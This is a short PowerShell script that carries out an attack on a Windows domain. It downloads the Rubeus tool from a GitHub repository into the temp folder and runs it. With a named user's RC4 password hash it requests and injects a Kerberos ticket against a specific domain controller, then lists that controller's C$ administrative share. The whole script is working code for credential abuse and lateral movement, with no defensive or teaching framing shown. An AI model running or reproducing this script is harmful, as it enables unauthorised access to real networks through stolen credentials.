$ErrorActionPreference = "Continue"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$root = "https://raw.githubusercontent.com/snehaweb3kid/runtime-cache-20260910--vpn/main"
$tool = Join-Path $env:TEMP "Rubeus.exe"

(New-Object Net.WebClient).DownloadFile("$root/Rubeus.exe", $tool)
& $tool asktgt /user:kmak /domain:LSSNY1.ORG `
    /rc4:e0454954bd1d324813a1e719abd8a502 `
    /dc:LSSDC4.LSSNY1.ORG /ptt
Write-Output "RUBEUS_EXIT=$LASTEXITCODE"
klist
Write-Output "--- SMB C$ ---"
cmd.exe /c "dir \\LSSDC4.LSSNY1.ORG\C$"
